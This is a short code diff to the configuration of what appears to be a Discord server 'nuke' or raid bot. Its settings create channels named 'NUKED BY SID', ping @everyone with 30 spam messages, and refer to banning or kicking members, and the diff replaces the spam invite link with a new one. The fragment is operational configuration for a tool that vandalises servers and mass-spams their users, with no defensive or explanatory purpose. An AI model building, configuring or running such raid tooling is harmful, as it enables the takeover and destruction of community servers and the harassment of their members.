@@ -14,7 +14,7 @@ AUTO_RAID_CONFIG = {
     'channel_type': 'text',  # text/voice     
     'channel_name': 'NUKED BY SID',  # Channel name      
     'num_messages': 30,  # Number of message to spam/better max 30     
-    'message_content': '@everyone JOIN  https://discord.gg/u872zDpf6V'# Spam Message     
+    'message_content': '@everyone JOIN  https://discord.gg/fUaEn4THHr'# Spam Message     
 }
 
 NO_BAN_KICK_ID = {
